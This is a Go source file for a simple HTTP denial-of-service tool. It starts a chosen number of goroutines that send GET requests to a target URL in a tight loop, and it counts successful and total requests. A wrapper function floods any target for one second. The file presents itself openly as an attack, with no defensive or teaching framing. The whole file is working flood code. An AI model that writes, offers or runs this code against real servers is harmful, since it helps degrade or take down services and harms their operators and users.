package dos

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"
)

// dos - structure of value for dos attack
type dos struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new dos attack
func New(URL string, workers int) (*dos, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &dos{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

func (d *dos) Attack() {
	c := 0
	for {
		select {
		case <-(*d.stop):
			return
		default:
			// sent http GET requests
			resp, err := http.Get(d.url)
			atomic.AddInt64(&d.amountRequests, 1)
			if err == nil {
				atomic.AddInt64(&d.successRequest, 1)
				_, _ = io.Copy(io.Discard, resp.Body)
				_ = resp.Body.Close()
			}
			c++
		}
		runtime.Gosched()
	}
}

// Run - run dos attack
func (d *dos) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go d.Attack()
	}
}

// Stop - stop dos attack
func (d *dos) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of dos attack
func (d dos) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}

func Run_dos(n_workers int, target string) {
	workers := n_workers
	url := target
	d, err := New(url, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Printf("dos attack server: %s \n", url)
	// Output: dos attack server: http://127.0.0.1:80
}
